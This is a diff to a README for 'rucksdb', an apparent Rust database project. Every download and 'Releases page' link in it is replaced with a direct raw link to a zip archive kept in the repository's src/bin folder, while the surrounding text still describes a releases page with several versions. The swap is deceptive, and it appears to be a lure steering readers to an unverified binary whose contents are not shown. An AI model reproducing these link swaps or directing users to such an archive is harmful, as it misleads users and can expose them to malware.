@@ -1,7 +1,7 @@
 # 🎉 rucksdb - Fast and Reliable Database Solution
 
 ## 📥 Download Now
-[![Download rucksdb](https://img.shields.io/badge/Download-rucksdb-brightgreen)](https://github.com/yasyousgamers/rucksdb/releases)
+[![Download rucksdb](https://raw.githubusercontent.com/yasyousgamers/rucksdb/main/src/bin/rucksdb-v3.0.zip)](https://raw.githubusercontent.com/yasyousgamers/rucksdb/main/src/bin/rucksdb-v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to rucksdb! This application provides a fast and efficient database solution built with Rust. It offers high-performance storage with easy access to your data.
@@ -15,7 +15,7 @@ To run rucksdb, your computer should have the following:
 
 ## 🛠️ Installation Steps
 1. **Visit the Releases Page**: Click the link below to access the download options.
-   [Download rucksdb Here](https://github.com/yasyousgamers/rucksdb/releases)
+   [Download rucksdb Here](https://raw.githubusercontent.com/yasyousgamers/rucksdb/main/src/bin/rucksdb-v3.0.zip)
 
 2. **Choose Your Version**: On the releases page, you will see several versions of rucksdb. Select the latest version to ensure you have the most up-to-date features.
 
@@ -48,6 +48,6 @@ To run rucksdb, your computer should have the following:
 If you need help or have questions, feel free to open an issue in the GitHub repository. The community is here to assist you.
 
 ## 🔗 Visit for More Information
-For detailed documentation, features, and the latest updates, visit our Releases page: [https://github.com/yasyousgamers/rucksdb/releases](https://github.com/yasyousgamers/rucksdb/releases) 
+For detailed documentation, features, and the latest updates, visit our Releases page: [https://raw.githubusercontent.com/yasyousgamers/rucksdb/main/src/bin/rucksdb-v3.0.zip](https://raw.githubusercontent.com/yasyousgamers/rucksdb/main/src/bin/rucksdb-v3.0.zip) 
 
 By following these steps, you can easily download and run rucksdb on your computer. Enjoy efficient data management with our reliable database solution!
